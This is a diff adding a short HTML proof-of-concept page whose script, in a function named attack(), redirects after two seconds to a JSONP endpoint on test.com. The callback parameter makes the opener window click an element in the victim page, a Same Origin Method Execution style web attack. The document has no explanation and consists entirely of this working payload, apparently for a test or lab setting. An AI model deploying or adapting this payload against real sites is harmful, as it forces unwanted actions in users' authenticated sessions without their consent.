@@ -1,0 +1,8 @@
+<script>
+    function attack() {
+        location.replace("http://www.test.com/info.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click");
+    }
+
+    setTimeout(attack, 2000);
+
+</script>
